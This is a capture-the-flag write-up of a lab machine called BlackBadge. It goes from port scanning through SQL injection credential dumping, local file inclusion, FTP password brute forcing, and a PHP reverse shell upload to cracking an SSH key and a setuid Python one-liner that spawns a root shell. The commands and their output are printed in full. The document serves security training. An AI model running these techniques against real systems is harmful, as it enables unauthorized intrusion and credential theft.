---
description: I saw this room on linkedin so lets give it a shot
---

# BlackBadge

## Reconnaissance

Lets start with rustscan&#x20;

```bash
rustscan -a 10.10.206.86 -b 500 -t 1000 -- -A -sV -sC
```

```bash
PORT     STATE SERVICE     REASON  VERSION
21/tcp   open  ftp         syn-ack vsftpd 3.0.5

22/tcp   open  ssh         syn-ack OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 a8:7c:9e:b0:16:c0:16:ac:64:da:42:1a:a9:46:41:a2 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBI1BUKaE/kspZO3XsYhuK8/43pyLNlAoblYrJ6cj6nLbFmNlQp2eoKv2SA2CxPvcLV0J6g1beXjVTMID4GhwcbY=
|   256 80:ca:99:8c:a1:d8:1e:0c:ea:c9:c5:c7:e1:9d:16:ed (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINIMwq6IqFuSoejiY72rmK9F3vS80kr6HF0+T0RTthg1

23/tcp   open  telnet?     syn-ack
| fingerprint-strings: 
|   HTTPOptions, Help, LPDString, NCP, NULL, SSLSessionReq, TLSSessionReq: 
|_    " Welcome to the BlackBadge CTF Challenge Server! "

139/tcp  open  netbios-ssn syn-ack Samba smbd 4

445/tcp  open  netbios-ssn syn-ack Samba smbd 4

8080/tcp open  http        syn-ack Apache httpd 2.4.52 ((Ubuntu))
| http-robots.txt: 1 disallowed entry 
|_/confidential_info.php
|_http-title: Apache2 Debian Default Page: It works
|_http-server-header: Apache/2.4.52 (Ubuntu)
| http-methods: 
|_  Supported Methods: OPTIONS HEAD GET POST

```

Hmm.. So much interesting stuff to look for&#x20;

lets start with looking at the website (port 8080)

looking at the source code we can see a comment taking about `/phpinfo.php`  &#x20;

also we found `/confidential_info.php`&#x20;

<figure><img src="../../../../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>

## Enumeration

lets start with visiting `/confidential_info.php`&#x20;

<figure><img src="../../../../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>

#### Found the First Flag :&#x20;

```
FLAG{G00d_3num3r4t10n_5k1ll5_D3t3ct3d_!!!}
```

lets look for any hidden directories using dirsearch

```bash
dirsearch -u http://10.10.206.86:8080/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

```bash
  _|. _ _  _  _  _ _|_    v0.4.3                                                                                                                                                                    
 (_||| _) (/_(_|| (_| )                                                                                                                                                                             
                                                                                                                                                                                                    
Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 220545

Output File: /home/Eth3real/thm/BlackBadge/reports/http_10.10.206.86_8080/__25-11-10_19-59-42.txt

Target: http://10.10.206.86:8080/

[19:59:42] Starting:                                                                                                                                                                                
[20:00:18] 301 -  323B  - /workplace  ->  http://10.10.206.86:8080/workplace/
[20:13:13] 403 -  279B  - /server-status                                    
                                                                              
Task Completed 
```

Hmm... a login page lets using `'` to see if we get any error&#x20;

here we go&#x20;

<figure><img src="../../../../.gitbook/assets/image (27).png" alt=""><figcaption></figcaption></figure>

So lets use sqlmap and give it our captured request ,after some tries I was able to find creds

```bash
 sqlmap -r request -p username \
  -D users -T users \
  -C "id,username,password" \
  --dump \
  --technique=BT \
  --time-sec=5 \
  --level=5 --risk=3 \
  --threads=8 \
  --batch -v 2
```

```bash
        ___
       __H__                                                                                                                                                                                        
 ___ ___[']_____ ___ ___  {1.9.10#stable}                                                                                                                                                           
|_ -| . [,]     | .'| . |                                                                                                                                                                           
|___|_  [,]_|_|_|__,|  _|                                                                                                                                                                           
      |_|V...       |_|   https://sqlmap.org                                                                                                                                                        

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
[*] starting @ 07:58:55 /2025-11-11/
[07:58:55] [INFO] parsing HTTP request from 'request'
[07:58:55] [DEBUG] cleaning up configuration parameters
[07:58:56] [DEBUG] setting the HTTP timeout
[07:58:56] [DEBUG] setting the HTTP User-Agent header
[07:58:56] [DEBUG] creating HTTP requests opener object
[07:58:56] [DEBUG] provided parameter 'username' is not inside the Cookie
[07:58:56] [INFO] resuming back-end DBMS 'mysql' 
[07:58:56] [INFO] testing connection to the target URL
[07:58:56] [DEBUG] declared web page charset 'utf-8'
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: username (POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)
    Payload: username=admin%' OR NOT 2458=2458#&password=admin
    Vector: OR NOT [INFERENCE]#

    Type: time-based blind
    Title: MySQL >= 5.0.12 OR time-based blind (SLEEP - comment)
    Payload: username=admin%' OR SLEEP(5)#&password=admin
    Vector: OR [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])#
---
Database: users
Table: users
[2 entries]
+----+----------+---------------+
| id | username | password      |
+----+----------+---------------+
| 1  | admin    | StrongPass123 |
| 2  | user     | p@ssword      |
+----+----------+---------------+

[07:59:20] [INFO] table 'users.users' dumped to CSV file '/home/Eth3real/.local/share/sqlmap/output/10.10.3.80/dump/users/users.csv'
[07:59:20] [INFO] fetched data logged to text files under '/home/Eth3real/.local/share/sqlmap/output/10.10.3.80'

[*] ending @ 07:59:20 /2025-11-11/
```

<figure><img src="../../../../.gitbook/assets/image (26).png" alt=""><figcaption></figcaption></figure>

#### Logging in with the found creds we get our Second Flag

```
FLAG{CTF_SQLi_L0g1n_Byp4ss_Us3rs_P4ssw0rds_DB_Dump_3xf1ltr4t10n_!!!}
```

now lets look for some interesting stuff in this website&#x20;

hmm we can see fileviewer.php maybe we can look for LFI

```
http://10.10.3.80:8080/workplace/fileviewer.php?file=info.php
```

here we go LFI

<figure><img src="../../../../.gitbook/assets/image (28).png" alt=""><figcaption></figcaption></figure>

#### We got our Fourth Flag

```
FLAG{LFI_Expl0it_R3ad_/etc/passwd_Acc3ssGrant3d_0xCAFEBABE1337_!!!}
```

but where is the Third flag ?? lets once again look around&#x20;

i found this help.php page&#x20;

<figure><img src="../../../../.gitbook/assets/image (29).png" alt=""><figcaption></figcaption></figure>

with some thing base64 encoded looking string with the Heading "Hint"

```bash
echo "L3MzY3IzdF9oMW50LnR4dA==" | base64 -d
/s3cr3t_h1nt.txt
```

hmm.. hidden directory&#x20;

<figure><img src="../../../../.gitbook/assets/image (30).png" alt=""><figcaption></figcaption></figure>

visiting the endpoint gives us a string(looks like BRAINFUCK) to decode to get the FLAG3 and also next hint too look for FTP

<figure><img src="../../../../.gitbook/assets/image (31).png" alt=""><figcaption></figcaption></figure>

#### There we go Found our Third Flag

```
FLAG{D1g1t4l_C1ph3r_Hunt3r_0x001}
```

now lets move on to FTP and try to login with anonymous&#x20;

```bash
ftp 10.10.222.45
```

```bash
Connected to 10.10.222.45.
220 (vsFTPd 3.0.5)
Name (10.10.222.45:Eth3real): anonymous
331 Please specify the password.
Password: 
530 Login incorrect.
ftp: Login failed
ftp> 
```

hmm it failed we need to try something else&#x20;

we also saw that port 139 and 445 are open so we can use enum4linux too look for smb shares

```bash
enum4linux -a 10.10.206.86
```

```bash
=================================( Share Enumeration on 10.10.206.86 )=================================
                                                                                                                                                                                                    
smbXcli_negprot_smb1_done: No compatible protocol selected by server.                                                                                                                               

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        anonymous       Disk      
        IPC$            IPC       IPC Service (blackbadge server (Samba, Ubuntu))
Reconnecting with SMB1 for workgroup listing.
Protocol negotiation to server 10.10.206.86 (for a protocol between LANMAN1 and NT1) failed: NT_STATUS_INVALID_NETWORK_RESPONSE
Unable to connect with SMB1 -- no workgroup available

[+] Attempting to map shares on 10.10.206.86                                                                                                                                                        
                                                                                                                                                                                                    
//10.10.206.86/print$   Mapping: DENIED Listing: N/A Writing: N/A                                                                                                                                   
//10.10.206.86/anonymous        Mapping: OK Listing: OK Writing: N/A

[E] Can't understand response:                                                                                                                                                                      
                                                                                                                                                                                                    
NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*                                                                                                                                                          
//10.10.206.86/IPC$     Mapping: N/A Listing: N/A Writing: N/A

==================( Users on 10.10.206.86 via RID cycling (RIDS: 500-550,1000-1050) )==================
                                                                                                                                                                                 
[+] Enumerating users using SID S-1-22-1 and logon username '', password ''                                                                                                                         
                                                                                                                                                                                                    
S-1-22-1-1000 Unix User\kkadmin (Local User)                                                                                                                                                        
S-1-22-1-1001 Unix User\ftpuser (Local User)
S-1-22-1-1002 Unix User\max (Local User)

[+] Enumerating users using SID S-1-5-21-2272417929-3846627980-1189004678 and logon username '', password ''                                                                                        
                                                                                                                                                                                                    
S-1-5-21-2272417929-3846627980-1189004678-501 BLACKBADGE\nobody (Local User)                                                                                                                        
S-1-5-21-2272417929-3846627980-1189004678-513 BLACKBADGE\None (Domain Group)

[+] Enumerating users using SID S-1-5-32 and logon username '', password ''                                                                                                                         
                                                                                                                                                                                                    
S-1-5-32-544 BUILTIN\Administrators (Local Group)                                                                                                                                                   
S-1-5-32-545 BUILTIN\Users (Local Group)
S-1-5-32-546 BUILTIN\Guests (Local Group)
S-1-5-32-547 BUILTIN\Power Users (Local Group)
S-1-5-32-548 BUILTIN\Account Operators (Local Group)
S-1-5-32-549 BUILTIN\Server Operators (Local Group)
S-1-5-32-550 BUILTIN\Print Operators (Local Group)
```

we can see that anonymous login is  allowed&#x20;

```bash
smbclient //10.10.206.86/anonymous
```

```bash
Password for [WORKGROUP\Eth3real]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sun Aug 24 20:36:39 2025
  ..                                  D        0  Wed Aug 20 13:25:48 2025
  flag5.txt                           N       87  Wed Aug 20 13:37:45 2025
  note.txt                            N      177  Wed Aug 20 13:37:59 2025

                20463184 blocks of size 1024. 9494332 blocks available              
smb: \> get flag5.txt 
getting file \flag5.txt of size 87 as flag5.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
smb: \> get note.txt 
getting file \note.txt of size 177 as note.txt (0.3 KiloBytes/sec) (average 0.2 KiloBytes/sec)
smb: \> exit

```

#### we found our Fifth Flag

```
FLAG{C0ngr4tz_Y0u_F0und_Th3_SMB_Sh4re_W1th_4n0nym0us_4cc3ss_And_Th1s_Is_Th3__Fl4g_!!!}
```

also we found `note.txt`

```bash
cat note.txt 
Looks like one of the users has been a little careless…  
I heard the ftpuser still hasn’t changed their password.  
Maybe something simple, something anyone could guess.
```

as we now know the username we can simply use hydra to bruteforce the password

```bash
hydra -l ftpuser -P /usr/share/wordlists/rockyou.txt 10.10.206.86 ftp
```

```bash
Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-11-10 20:03:16
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ftp://10.10.206.86:21/
[21][ftp] host: 10.10.206.86   login: ftpuser   password: babygurl
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-11-10 20:04:08
```

now we can just simply log into ftp&#x20;

```bash
ftp 10.10.222.45               
Connected to 10.10.222.45.
220 (vsFTPd 3.0.5)
Name (10.10.222.45:Eth3real): ftpuser
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||10063|)
150 Here comes the directory listing.
drwxrwx---    2 1001     33           4096 Aug 26 18:16 null
226 Directory send OK.
ftp> ls -la
229 Entering Extended Passive Mode (|||10019|)
150 Here comes the directory listing.
drwxr-xr-x    3 0        33           4096 Aug 26 07:20 .
drwxr-xr-x    3 0        33           4096 Aug 26 07:20 ..
-rw-------    1 1001     1001           41 Aug 26 07:20 .flag6.txt
drwxrwx---    2 1001     33           4096 Aug 26 18:16 null
226 Directory send OK.
ftp> cd null
250 Directory successfully changed.
ftp> ls
229 Entering Extended Passive Mode (|||10098|)
150 Here comes the directory listing.
226 Directory send OK.
ftp> ls -la
229 Entering Extended Passive Mode (|||10033|)
150 Here comes the directory listing.
drwxrwx---    2 1001     33           4096 Aug 26 18:16 .
drwxr-xr-x    3 0        33           4096 Aug 26 07:20 ..
226 Directory send OK.
```

#### We got our Sixth Flag&#x20;

```
FLAG{4cc3ss_gr4nt3d_t0_d07_f14g_6_!!!!!}
```

## Exploitation

Hmm.. did you saw that ?? null directory permission&#x20;

we can upload any file ( reverse shell )

```bash
drwxr-xr-x    3 0        33           4096 Aug 26 07:20 .
drwxr-xr-x    3 0        33           4096 Aug 26 07:20 ..
-rw-------    1 1001     1001           41 Aug 26 07:20 .flag6.txt
drwxrwx---    2 1001     33           4096 Aug 26 18:16 null
226 Directory send OK.

ftp> cd null
250 Directory successfully changed.

ftp> put rev.php
local: rev.php remote: rev.php
229 Entering Extended Passive Mode (|||10099|)
150 Ok to send data.
100% |*******************************************************************************************************************************************************|  5494       31.56 MiB/s    00:00 ETA
226 Transfer complete.
5494 bytes sent in 00:00 (19.03 KiB/s)

ftp> chmod 777 rev.php
200 SITE CHMOD command ok.

ftp> ls -la
229 Entering Extended Passive Mode (|||10005|)
150 Here comes the directory listing.
drwxrwx---    2 1001     33           4096 Nov 12 03:18 .
drwxr-xr-x    3 0        33           4096 Aug 26 07:20 ..
-rwxrwxrwx    1 1001     1001         5494 Nov 12 03:18 rev.php
226 Directory send OK.

```

now lets activate our reverse shell

<figure><img src="../../../../.gitbook/assets/image (32).png" alt=""><figcaption></figcaption></figure>

```bash
penelope        
[+] Listening for reverse shells on 0.0.0.0:4444 →  127.0.0.1 • 10.0.2.3 • 172.17.0.1 • 10.11.152.146
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
[+] Got reverse shell from blackbadge~10.10.24.206-Linux-x86_64 😍 Assigned SessionID <1>
[+] Attempting to upgrade shell to PTY...
[+] Shell upgraded successfully using /usr/bin/python3! 💪
[+] Interacting with session [1], Shell Type: PTY, Menu key: F12 
[+] Logging to /home/Eth3real/.penelope/sessions/blackbadge~10.10.24.206-Linux-x86_64/2025_11_12-09_05_06-040.log 📜
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
Flag7: FLAG{W3b_Sh3ll_Init1al_Acc3ss_0x1337_W3lcome_!!!}
www-data@blackbadge:/$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

#### We got our Seventh Flag Welcoming us!

```
FLAG{W3b_Sh3ll_Init1al_Acc3ss_0x1337_W3lcome_!!!}
```

## Lateral Movement

### www-data ---> kkadmin

let's check `sudo -l`

```bash
www-data@blackbadge:/$ sudo -l
Matching Defaults entries for www-data on blackbadge:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User www-data may run the following commands on blackbadge:
    (kkadmin) NOPASSWD: /usr/bin/less
```

less ?? lets check on GTFOBins.

```bash
www-data@blackbadge:/$ sudo -u /usr/bin/less /etc/profile
sudo: unknown user /usr/bin/less
sudo: error initializing audit plugin sudoers_audit
www-data@blackbadge:/$ sudo -u kkadmin /usr/bin/less /etc/profile

  ____  _            _    ____            _            
 |  _ \| |          | |  |  _ \          | |           
 | |_) | | __ _  ___| | _| |_) | __ _  __| | __ _  ___ 
 |  _ <| |/ _` |/ __| |/ /  _ < / _` |/ _` |/ _` |/ _ \
 | |_) | | (_| | (__|   <| |_) | (_| | (_| | (_| |  __/
 |____/|_|\__,_|\___|_|\_\____/ \__,_|\__,_|\__, |\___|
                                             __/ |     
                                            |___/      

🚩 Unauthorized terminal access granted [!]
💀 You are being watched...
⚠  Think twice before executing commands!

kkadmin@blackbadge:/$ id
uid=1000(kkadmin) gid=1000(kkadmin) groups=1000(kkadmin),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd)
kkadmin@blackbadge:/$ 
```

Ezzzyy

```bash
kkadmin@blackbadge:~$ cd Templates/
kkadmin@blackbadge:~/Templates$ ls
-flag8.txt
kkadmin@blackbadge:~/Templates$ cat ./-flag8.txt 
FLAG{us3r_kk4dm1n_h4s_b33n_c0mpr0m1s3d\!\!\!}
kkadmin@blackbadge:~/Templates$ 
```

#### Found our Eighth Flag

```
FLAG{us3r_kk4dm1n_h4s_b33n_c0mpr0m1s3d\!\!\!}
```

### kkadmin ---> max

after bit of searching found max's id\_rsa in `/var/backups`

```bash
kkadmin@blackbadge:/var/backups$ ls
apt.extended_states.0  apt.extended_states.1.gz  apt.extended_states.2.gz  apt.extended_states.3.gz  apt.extended_states.4.gz  apt.extended_states.5.gz  apt.extended_states.6.gz  id_rsa_max
kkadmin@blackbadge:/var/backups$ cat id_rsa_max 
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABDgcDV6ne
+8STlmFD8EFwbTAAAAEAAAAAEAAAEXAAAAB3NzaC1yc2EAAAADAQABAAABAQC6P6KIv/ST
dFceGdO0lJwDJkm3MO7rOkb0fTKVueRMyYy00JN875CUuJ2fWrX8q0AHTSBDPG4kQ1fG5Z
31zga3fCJ9L96PWxVVGJ14ePNI6Ak0fLNeHsq3q8V1gb/5fwoBrMoG09+XkTAgDIKPRCqJ
GEmGe9u0DDP9PsT9v1ySlAheqR3rdNZg7IhdaBJRdZOuNa6mnNW1Sk04W6SSG6N9aQFVJo
a2QYG2kEM/JSegtzToysp2dKNvpO3k0NiYFcOEN7swFpXGCshsqxP1l7yW1aeuylzv8Ejj
nKw6COqV6VMGFuHBX5UDoidv+erC6k6s9PXZUQs+6VJqRIBKtLAPAAAD0K4eJA1uNb13D8
bgeJc0dqi+UKZ/hR1sRjGL4qPZnaR7xkxeBG2Mojus5KKcvREYiXDAIKwJ3HPyzvtjnWkk
ICyzeWVSRK2PzRn/8IGnltSsBWhniz9+EpEOH1V/z/taNeb8SvnzsNO1j7NwxzVgCR0z8F
Z9fod6pt8sPrAloF4AMyCfLb3+o6FyIlLw84rtd8wJFovt7luGamTtvwajUXr7ZDLaVm0l
hARLLxCDqdhoG2XvK6QEXokiuY1qsl+W8eU6oPF15Oy0SDAwlo2YpI64XIEaL2E85IhxV1
JtqalzkSJjl0yLkPTVYcy3g+hzFNiDt6wkykAnBmiVluvX908+u3IRqKwnUNPyBInmCrZM
KVh+sgn1ta2E5D56g3W5lBgBUvC8cBhAxydlohVZAVMhGG6skug38NGpX5wrYnLdLiY54W
27itAgDd55VDGgsj3MYHKLfAaQ4d1JhS+X9vspC3tzDxVogEQs4pBjn7aQM8wlspGNxEdj
GS41k6G+0cvjSbu0uSXu3ZTeARJSDiG6PVeY5Hi75XgpMaL2jdm96xqXeMMs6Vkyt22UZ5
AlQ1fKyyXIrNXZnp3C//Cnk8veFT3acVmH+c+8P0zZUQltL2ZQEATOoMnz9DU1c1puDWXw
74gOjG5pS29hFMja/aCJhOdtplUG6p0c2jlgbvHRWjHyDqN4w0czhS/Jv+OyOeHsTYTM16
g6d0dfwq4+x/SkT5RrEqO/wNmJH6rtRcnUjIf1DMdnk3WkWYRGJ6Snhk+sLus/glHBTzqS
WFCM7dSB5TRlyPzo3uxWi+RPMJ4t7a4g6QKivqlKrZpdDrPdW9S6gunGQTrLwTkTT6JErA
WibCw687GP6TA9dlhjzJ061s+7xfSnC7dcTyIFXR+LGCiK92KgI9zZsd2Qh3a3YBVHqQcF
tu3LmSMRBS3Jf8h505QBXr8kGQHDfC8sapTrcdpBXPURi35cdATchs1DTkwenKtI+x+kTr
jr69X82xCX2ZSQqenKzcBWyqJoBleasHMjAOtQIY38yEFX6HwnCmExm4/Ul6rBfKIk9mvN
4rVDUqkwkPbF5FYYMEBK/4YYixDnw2KHaTmqzuss3AYIIS+hB3wh4NkUSgjn2ttZ/nSlXx
gwkDL6AVwh7Z6jqawSGk55+yH5iRfAnIqP0ZruwOl3/k+K8i5aO7v9BSjTvKTAk+FbdM0l
qZKK9jthBfvjilKmLwLsFDLymb4F1DyDRgZEyCnnjU0LJTZmM7wbl8tP3CW3Zfm5ID83TY
+Wy1U7ti+OInDwoXj4BJ5T9mPet1I=
-----END OPENSSH PRIVATE KEY-----

```

lets save it and try to login as max with ssh

```bash
┌──(Eth3real㉿DΣDSEC)-[~/thm/BlackBadge]
└─$ chmod 600 max_id_rsa 
                                                                                                                                                                                                    
┌──(Eth3real㉿DΣDSEC)-[~/thm/BlackBadge]
└─$ ssh -i max_id_rsa max@10.10.24.206  
The authenticity of host '10.10.24.206 (10.10.24.206)' can't be established.
ED25519 key fingerprint is: SHA256:gbDpNQopedYkUgAalKP9j/+L0irJOWEoTZOieAsZ9R8
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:93: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.24.206' (ED25519) to the list of known hosts.
Enter passphrase for key 'max_id_rsa': 
```

passphrase protected can simply try to crack it with `ssh2john` utility

```bash
┌──(Eth3real㉿DΣDSEC)-[~/thm/BlackBadge]
└─$ ssh2john max_id_rsa > id_rsa_hash
                                                                                                                                                                                                    
┌──(Eth3real㉿DΣDSEC)-[~/thm/BlackBadge]
└─$ john id_rsa_hash --wordlist=/usr/share/wordlists/rockyou.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
No password hashes left to crack (see FAQ)
                                                                                                                                                                                                    
┌──(Eth3real㉿DΣDSEC)-[~/thm/BlackBadge]
└─$ john --show id_rsa_hash                                            
max_id_rsa:superman

1 password hash cracked, 0 left
```

now we can simply login and now we are max

```bash
max@blackbadge:~$ id
uid=1002(max) gid=1002(max) groups=1002(max)
max@blackbadge:~$ cd Pub-rbash: /dev/null: restricted: cannot redirect output
bash_completion: _upvars: `-a2': invalid number specifier
-rbash: /dev/null: restricted: cannot redirect output
bash_completion: _upvars: `-a0': invalid number specifier

-rbash: cd: restricted
```

Ohkk rbash we can simple bypass this&#x20;

{% embed url="https://www.hackingarticles.in/multiple-methods-to-bypass-restricted-shell/" %}

```bash
max@blackbadge:~$ ls -la
total 72
drwxr-x--- 13 max  max  4096 Aug 20 07:22 .
drwxr-xr-x  5 root root 4096 Aug 19 11:05 ..
lrwxrwxrwx  1 max  max     9 Aug 20 07:08 .bash_history -> /dev/null
-rw-r--r--  1 max  max   220 Aug 19 11:05 .bash_logout
-rw-r--r--  1 max  max  3771 Aug 19 11:05 .bashrc
drwx------  2 max  max  4096 Aug 19 12:12 .cache
drwxrwxr-x  2 max  max  4096 Aug 19 18:51 Desktop
drwxrwxr-x  2 max  max  4096 Aug 19 18:51 Documents
drwxrwxr-x  2 max  max  4096 Aug 19 18:51 Downloads
drwxrwxr-x  3 max  max  4096 Aug 19 18:44 .local
drwxrwxr-x  2 max  max  4096 Aug 19 18:51 Music
drwxrwxr-x  2 max  max  4096 Aug 20 06:58 Pictures
-rw-r--r--  1 max  max   807 Aug 19 11:05 .profile
drwxrwxr-x  2 max  max  4096 Aug 20 07:11 Public
drwx------  2 max  max  4096 Aug 19 12:36 .ssh
drwxrwxr-x  2 max  max  4096 Aug 19 18:51 Templates
-rw-rw-r--  1 max  max   194 Aug 19 18:47 .user.txt.tar.gz
drwxrwxr-x  2 max  max  4096 Aug 19 18:51 Videos
-rw-------  1 max  max   642 Aug 20 07:22 .viminfo
max@blackbadge:~$ tar -xvzf .user.txt.tar.gz 
user.txt
max@blackbadge:~$ cat user.txt 
FLAG{u53r_fl4g_c0mpr0m153d_w17h_pr1v1l3g3_3sc4l4710n_4nd_p455w0rd_cr4ck1ng_!!!}
```

#### Lets goo we got out user.txt Flag

```
FLAG{u53r_fl4g_c0mpr0m153d_w17h_pr1v1l3g3_3sc4l4710n_4nd_p455w0rd_cr4ck1ng_!!!}
```

## Privilege Escalation ( max ---> root )

After trying basic PE vectors I found this&#x20;

<pre class="language-bash"><code class="lang-bash">max@blackbadge:~/Public$ getcap -r / 2>/dev/null
/usr/bin/ping cap_net_raw=ep
/usr/bin/mtr-packet cap_net_raw=ep
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper cap_net_bind_service,cap_net_admin=ep
/snap/core20/2669/usr/bin/ping cap_net_raw=ep
/snap/core20/2599/usr/bin/ping cap_net_raw=ep
/snap/snapd/25202/usr/lib/snapd/snap-confine cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_sys_chroot,cap_sys_ptrace,cap_sys_admin=p
/snap/snapd/24792/usr/lib/snapd/snap-confine cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_sys_chroot,cap_sys_ptrace,cap_sys_admin=p
<a data-footnote-ref href="#user-content-fn-1">/home/max/Public/python-root cap_setuid=ep</a>

max@blackbadge:~$ file /home/max/Public/python-root 
/home/max/Public/python-root: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=2080234d131e195f193298f8a6d0878a5dc769cb, for GNU/Linux 3.2.0, stripped
</code></pre>

I used this payload to get the root shell

```
./python-root -c 'import ctypes,pty; libc=ctypes.CDLL("libc.so.6"); libc.setresgid(0,0,0); libc.setresuid(0,0,0); pty.spawn("/bin/bash")'
```

```bash
max@blackbadge:~/Public$ ./python-root -c 'import ctypes,pty; libc=ctypes.CDLL("libc.so.6"); libc.setresgid(0,0,0); libc.setresuid(0,0,0); pty.spawn("/bin/bash")'
root@blackbadge:~/Public# /max/Public
root@blackbadge:~/Public# /python-root -c 'import ctypes,pty; libc=ctypes.CDLL("libc.so.6"); libc.setresgid(0,0,0); libc.setresuid(0,0,0); pty.spawn("/bin/bash")'
root@blackbadge:~/Public# 
root@blackbadge:~/Public# id
uid=0(root) gid=1002(max) groups=1002(max)
root@blackbadge:~# cd /root
root@blackbadge:/root# ls
hidden.jpg  snap
root@blackbadge:/root# python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

lets get that hidden.jpg file on our local machine

I used stegseek to crack it

```bash
┌──(Eth3real㉿DΣDSEC)-[~/thm/BlackBadge]
└─$ stegseek hidden.jpg 
StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

[i] Found passphrase: "ilov3hacking"   
[i] Original filename: "root.txt".
[i] Extracting to "hidden.jpg.out".
```

```bash
┌──(Eth3real㉿DΣDSEC)-[~/thm/BlackBadge]
└─$ cat hidden.jpg.out

██████╗ ██╗      █████╗  ██████╗██╗  ██╗██████╗  █████╗ ██████╗  ██████╗ ███████╗
██╔══██╗██║     ██╔══██╗██╔════╝██║ ██╔╝██╔══██╗██╔══██╗██╔══██╗██╔════╝ ██╔════╝
██████╔╝██║     ███████║██║     █████╔╝ ██████╔╝███████║██║  ██║██║  ███╗█████╗  
██╔══██╗██║     ██╔══██║██║     ██╔═██╗ ██╔══██╗██╔══██║██║  ██║██║   ██║██╔══╝  
██████╔╝███████╗██║  ██║╚██████╗██║  ██╗██████╔╝██║  ██║██████╔╝╚██████╔╝███████╗
╚═════╝ ╚══════╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚═════╝ ╚═╝  ╚═╝╚═════╝  ╚═════╝ ╚══════╝
                                                                                 

📜 Congratulations, Operator.

You've successfully infiltrated **KK Group's** internal HR network.  
Despite all their money, power, and arrogance — they forgot the golden rule:

> "Security through obscurity is not security at all."

You've demonstrated:

✔️ Enumeration skills  
✔️ Exploitation precision  
✔️ Privilege escalation mastery  
✔️ CTF patience 🧠⚔️  

🚩 **Root Flag**: FLAG{r00t_acc3ss_grant3d_4dm1n_v4ult_br34ch3d_$3cur1ty_m1sf1r3!!!}

💡 **Final Note**:  
Always remember — real-world systems might be messier, but the mindset stays sharp.  
Take this as another step toward becoming a skilled ethical hacker.  

- 💀 From the shadows,  
  `0xBlackBadge` 🐾
```

#### Lets goo we found root.txt Flag

```
FLAG{r00t_acc3ss_grant3d_4dm1n_v4ult_br34ch3d_$3cur1ty_m1sf1r3!!!}
```

Hope you found this useful

Thankyou for Reading☺️.

[^1]: hmm named python-root and that too setuid
